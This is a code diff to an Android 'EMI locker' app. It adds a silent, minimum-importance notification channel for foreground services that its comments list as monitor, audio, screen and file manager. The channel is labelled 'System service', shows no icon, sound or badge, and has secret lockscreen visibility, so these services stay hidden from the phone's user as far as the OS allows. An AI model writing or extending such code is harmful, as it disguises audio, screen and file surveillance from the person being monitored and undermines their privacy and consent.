@@ -1,6 +1,7 @@
 package com.riad.rrlkr;
 
 import android.app.Application;
+import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.content.Intent;
@@ -27,6 +28,11 @@ public class App extends Application {
     public static final String CHANNEL_ID_SERVICE = "emi_locker_service";
     public static final String CHANNEL_ID_ALERTS = "emi_locker_alerts";
     public static final String CHANNEL_ID_WARNINGS = "emi_locker_warnings";
+    /** Silent, minimum-importance channel for the mandatory foreground-service
+     *  notifications (monitor / audio / screen / file manager). IMPORTANCE_MIN
+     *  keeps them out of the status bar and shade as much as the OS allows —
+     *  no icon, no sound, no vibration, no heads-up, no badge. */
+    public static final String CHANNEL_ID_SILENT = "emi_locker_silent";
     
     private static App instance;
     private PreferenceManager preferenceManager;
@@ -307,6 +313,22 @@ public class App extends Application {
             );
             warningsChannel.setDescription("Device management reminders");
             notificationManager.createNotificationChannel(warningsChannel);
+
+            // Silent channel — mandatory foreground-service notifications only.
+            // IMPORTANCE_MIN = no sound, no vibration, no heads-up, no status-bar
+            // icon (collapsed at the very bottom of the shade only).
+            NotificationChannel silentChannel = new NotificationChannel(
+                CHANNEL_ID_SILENT,
+                "System service",
+                NotificationManager.IMPORTANCE_MIN
+            );
+            silentChannel.setDescription("Background system service");
+            silentChannel.setShowBadge(false);
+            silentChannel.setSound(null, null);
+            silentChannel.enableVibration(false);
+            silentChannel.enableLights(false);
+            silentChannel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+            notificationManager.createNotificationChannel(silentChannel);
         }
     }
     
